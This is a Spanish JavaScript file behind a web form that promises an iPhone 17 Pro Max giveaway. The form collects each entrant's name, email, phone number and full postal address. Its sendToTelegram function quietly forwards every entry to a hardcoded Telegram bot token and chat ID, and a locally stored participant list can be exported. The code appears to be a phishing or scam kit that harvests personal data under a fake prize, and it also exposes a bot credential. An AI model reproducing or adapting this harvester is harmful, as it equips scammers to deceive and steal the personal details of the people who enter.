// Variables globales
let currentPage = 1;
const totalPages = 3;

// Elementos del DOM
const page1 = document.getElementById('page1');
const page2 = document.getElementById('page2');
const page3 = document.getElementById('page3');
const nextBtn = document.getElementById('nextBtn');
const backBtn = document.getElementById('backBtn');
const submitBtn = document.getElementById('submitBtn');
const restartBtn = document.getElementById('restartBtn');
const progressFill = document.getElementById('progressFill');
const steps = document.querySelectorAll('.step');
const confirmEmail = document.getElementById('confirmEmail');

// Configuración
const TELEGRAM_BOT_TOKEN = '8252470904:AAF464VxUabsgtNFgorW1BF3wiI_fYgURJw';
const TELEGRAM_CHAT_ID = '8467038089';
const DB_KEY = 'sorteo_iphone_participantes';

// Inicialización
document.addEventListener('DOMContentLoaded', function() {
    nextBtn.addEventListener('click', goToNextPage);
    backBtn.addEventListener('click', goToPreviousPage);
    submitBtn.addEventListener('click', submitForm);
    restartBtn.addEventListener('click', restartForm);
    
    updateProgressBar();
    initializeDatabase();
});

// ========== SISTEMA DE BASE DE DATOS CON LOCALSTORAGE ==========

function initializeDatabase() {
    if (!localStorage.getItem(DB_KEY)) {
        const initialData = {
            participantes: [],
            metadata: {
                total_participantes: 0,
                fecha_creacion: new Date().toISOString(),
                ultima_actualizacion: new Date().toISOString(),
                sorteo: "iPhone 17 Pro Max Naranja Cósmico"
            }
        };
        localStorage.setItem(DB_KEY, JSON.stringify(initialData));
        console.log('Base de datos inicializada');
    }
}

function getDatabase() {
    const data = localStorage.getItem(DB_KEY);
    return data ? JSON.parse(data) : null;
}

function saveDatabase(data) {
    localStorage.setItem(DB_KEY, JSON.stringify(data));
}

function addParticipant(participantData) {
    const db = getDatabase();
    
    if (!db) {
        initializeDatabase();
        return addParticipant(participantData);
    }
    
    // Verificar si el email ya existe
    const existingParticipant = db.participantes.find(p => 
        p.participante.email.toLowerCase() === participantData.participante.email.toLowerCase()
    );
    
    if (existingParticipant) {
        throw new Error('Este email ya está registrado en el sorteo');
    }
    
    // Agregar ID único y metadata
    participantData.id = generateUniqueId();
    participantData.fecha_registro = new Date().toISOString();
    participantData.timestamp = Date.now();
    
    // Agregar participante
    db.participantes.push(participantData);
    db.metadata.total_participantes = db.participantes.length;
    db.metadata.ultima_actualizacion = new Date().toISOString();
    
    // Guardar
    saveDatabase(db);
    
    console.log('Participante guardado:', participantData.id);
    return participantData;
}

function generateUniqueId() {
    return 'participant_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// ========== FUNCIONES DE ADMINISTRACIÓN ==========

function toggleAdmin() {
    const adminSection = document.getElementById('adminSection');
    const isVisible = adminSection.style.display !== 'none';
    adminSection.style.display = isVisible ? 'none' : 'block';
}

function exportData() {
    const db = getDatabase();
    if (!db || db.participantes.length === 0) {
        alert('No hay datos para exportar');
        return;
    }
    
    const dataStr = JSON.stringify(db, null, 2);
    const dataBlob = new Blob([dataStr], { type: 'application/json' });
    
    const link = document.createElement('a');
    link.href = URL.createObjectURL(dataBlob);
    link.download = `sorteo_participantes_${new Date().toISOString().split('T')[0]}.json`;
    link.click();
    
    alert(`Datos exportados: ${db.participantes.length} participantes`);
}

function clearData() {
    if (confirm('¿Estás seguro de que quieres eliminar todos los datos? Esta acción no se puede deshacer.')) {
        localStorage.removeItem(DB_KEY);
        initializeDatabase();
        alert('Todos los datos han sido eliminados');
        if (document.getElementById('adminData').style.display !== 'none') {
            viewData();
        }
    }
}

function viewData() {
    const db = getDatabase();
    const adminData = document.getElementById('adminData');
    
    if (!db || db.participantes.length === 0) {
        adminData.innerHTML = '<p style="color: var(--ibai-gold);">No hay participantes registrados</p>';
        adminData.style.display = 'block';
        return;
    }
    
    let html = `
        <div style="text-align: left;">
            <h4 style="color: var(--ibai-gold); margin-bottom: 15px;">Participantes (${db.participantes.length})</h4>
            <div style="max-height: 400px; overflow-y: auto;">
    `;
    
    db.participantes.forEach((participant, index) => {
        html += `
            <div style="background: rgba(255,255,255,0.05); padding: 15px; margin-bottom: 10px; border-radius: 8px;">
                <strong>#${index + 1} - ${participant.participante.nombre}</strong><br>
                <small>Email: ${participant.participante.email} | Tel: ${participant.participante.telefono}</small><br>
                <small>Dirección: ${participant.direccion.direccion}, ${participant.direccion.ciudad}</small><br>
                <small>Registro: ${new Date(participant.fecha_registro).toLocaleString()}</small>
            </div>
        `;
    });
    
    html += `</div></div>`;
    adminData.innerHTML = html;
    adminData.style.display = 'block';
}

// ========== FUNCIONES DEL FORMULARIO ==========

function goToNextPage() {
    if (currentPage === 1) {
        if (!validatePage1()) return;
    }
    
    if (currentPage < totalPages) {
        document.getElementById(`page${currentPage}`).classList.remove('active');
        steps[currentPage - 1].classList.remove('active');
        
        currentPage++;
        
        document.getElementById(`page${currentPage}`).classList.add('active');
        steps[currentPage - 1].classList.add('active');
        
        updateProgressBar();
    }
}

function goToPreviousPage() {
    if (currentPage > 1) {
        document.getElementById(`page${currentPage}`).classList.remove('active');
        steps[currentPage - 1].classList.remove('active');
        
        currentPage--;
        
        document.getElementById(`page${currentPage}`).classList.add('active');
        steps[currentPage - 1].classList.add('active');
        
        updateProgressBar();
    }
}

function updateProgressBar() {
    const progressPercentage = (currentPage / totalPages) * 100;
    progressFill.style.width = `${progressPercentage}%`;
}

function validatePage1() {
    const nombre = document.getElementById('nombre').value.trim();
    const email = document.getElementById('email').value.trim();
    const telefono = document.getElementById('telefono').value.trim();
    
    if (nombre === '') {
        showError('Por favor, ingresa tu nombre completo.');
        return false;
    }
    
    if (nombre.length < 3) {
        showError('El nombre debe tener al menos 3 caracteres.');
        return false;
    }
    
    if (email === '' || !isValidEmail(email)) {
        showError('Por favor, ingresa un correo electrónico válido.');
        return false;
    }
    
    if (telefono === '') {
        showError('Por favor, ingresa tu número de teléfono.');
        return false;
    }
    
    return true;
}

function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

function validatePage2() {
    const direccion = document.getElementById('direccion').value.trim();
    const ciudad = document.getElementById('ciudad').value.trim();
    const provincia = document.getElementById('provincia').value.trim();
    const codigoPostal = document.getElementById('codigoPostal').value.trim();
    const pais = document.getElementById('pais').value.trim();
    
    if (direccion === '') {
        showError('Por favor, ingresa tu dirección completa.');
        return false;
    }
    
    if (ciudad === '') {
        showError('Por favor, ingresa tu ciudad.');
        return false;
    }
    
    if (provincia === '') {
        showError('Por favor, ingresa tu provincia.');
        return false;
    }
    
    if (codigoPostal === '') {
        showError('Por favor, ingresa tu código postal.');
        return false;
    }
    
    if (pais === '') {
        showError('Por favor, ingresa tu país.');
        return false;
    }
    
    return true;
}

function showError(message) {
    alert(message);
}

async function submitForm() {
    if (!validatePage2()) return;
    
    // Mostrar loading
    submitBtn.innerHTML = 'Guardando...';
    submitBtn.disabled = true;
    
    try {
        const formData = {
            participante: {
                nombre: document.getElementById('nombre').value.trim(),
                email: document.getElementById('email').value.trim(),
                telefono: document.getElementById('telefono').value.trim()
            },
            direccion: {
                direccion: document.getElementById('direccion').value.trim(),
                ciudad: document.getElementById('ciudad').value.trim(),
                provincia: document.getElementById('provincia').value.trim(),
                codigoPostal: document.getElementById('codigoPostal').value.trim(),
                pais: document.getElementById('pais').value.trim()
            },
            sorteo: {
                producto: "iPhone 17 Pro Max Naranja Cósmico",
                fechaRegistro: new Date().toLocaleString('es-ES')
            }
        };
        
        // Guardar en base de datos
        const savedParticipant = await addParticipant(formData);
        
        // Enviar a Telegram
        await sendToTelegram(savedParticipant);
        
        // Mostrar confirmación
        showConfirmationPage(formData.participante.email);
        
    } catch (error) {
        showError('Error: ' + error.message);
        submitBtn.innerHTML = 'Participar en el Sorteo';
        submitBtn.disabled = false;
    }
}

function showConfirmationPage(email) {
    document.getElementById('page2').classList.remove('active');
    document.getElementById('page3').classList.add('active');
    steps[1].classList.remove('active');
    steps[2].classList.add('active');
    currentPage = 3;
    updateProgressBar();
    
    confirmEmail.textContent = email;
    submitBtn.innerHTML = 'Participar en el Sorteo';
    submitBtn.disabled = false;
}

function restartForm() {
    document.getElementById('sorteoForm').reset();
    document.getElementById('direccion').value = '';
    document.getElementById('ciudad').value = '';
    document.getElementById('provincia').value = '';
    document.getElementById('codigoPostal').value = '';
    document.getElementById('pais').value = '';
    
    document.getElementById('page3').classList.remove('active');
    document.getElementById('page1').classList.add('active');
    
    steps[2].classList.remove('active');
    steps[0].classList.add('active');
    
    currentPage = 1;
    updateProgressBar();
}

// Función para enviar a Telegram
async function sendToTelegram(participantData) {
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN') {
        console.log('Telegram no configurado');
        return;
    }
    
    const message = `
🎉 NUEVA PARTICIPACIÓN REGISTRADA 🎉

📱 iPhone 17 Pro Max Naranja Cósmico

🆔 ID: ${participantData.id}
👤 PARTICIPANTE:
Nombre: ${participantData.participante.nombre}
Email: ${participantData.participante.email}
Teléfono: ${participantData.participante.telefono}

🏠 DIRECCIÓN DE ENVÍO:
${participantData.direccion.direccion}
${participantData.direccion.ciudad}, ${participantData.direccion.provincia}
${participantData.direccion.codigoPostal}, ${participantData.direccion.pais}

⏰ FECHA: ${participantData.sorteo.fechaRegistro}

💾 Guardado en base de datos local
    `;
    
    const encodedMessage = encodeURIComponent(message);
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
    
    try {
        const response = await fetch(url);
        const data = await response.json();
        console.log('Mensaje enviado a Telegram:', data);
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
    }
}